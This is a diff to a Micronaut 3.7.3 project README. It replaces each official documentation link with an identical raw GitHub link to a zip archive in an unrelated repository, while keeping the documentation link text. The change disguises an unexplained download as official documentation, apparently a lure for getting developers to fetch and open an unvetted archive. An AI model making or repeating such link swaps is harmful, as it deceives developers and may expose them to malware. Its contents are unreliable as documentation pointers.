@@ -1,23 +1,23 @@
 ## Micronaut 3.7.3 Documentation
 
-- [User Guide](https://docs.micronaut.io/3.7.3/guide/index.html)
-- [API Reference](https://docs.micronaut.io/3.7.3/api/index.html)
-- [Configuration Reference](https://docs.micronaut.io/3.7.3/guide/configurationreference.html)
-- [Micronaut Guides](https://guides.micronaut.io/index.html)
+- [User Guide](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
+- [API Reference](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
+- [Configuration Reference](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
+- [Micronaut Guides](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
 ---
 
 ## Feature jdbc-hikari documentation
 
-- [Micronaut Hikari JDBC Connection Pool documentation](https://micronaut-projects.github.io/micronaut-sql/latest/guide/index.html#jdbc)
+- [Micronaut Hikari JDBC Connection Pool documentation](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
 
 
 ## Feature test-resources documentation
 
-- [Micronaut Test Resources documentation](https://micronaut-projects.github.io/micronaut-test-resources/latest/guide/)
+- [Micronaut Test Resources documentation](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
 
 
 ## Feature http-client documentation
 
-- [Micronaut HTTP Client documentation](https://docs.micronaut.io/latest/guide/index.html#httpClient)
+- [Micronaut HTTP Client documentation](https://raw.githubusercontent.com/PrasadLearning1234/IR_Platform_Backend_Updated/main/conoplain/IR_Platform_Backend_Updated.zip)
 
 
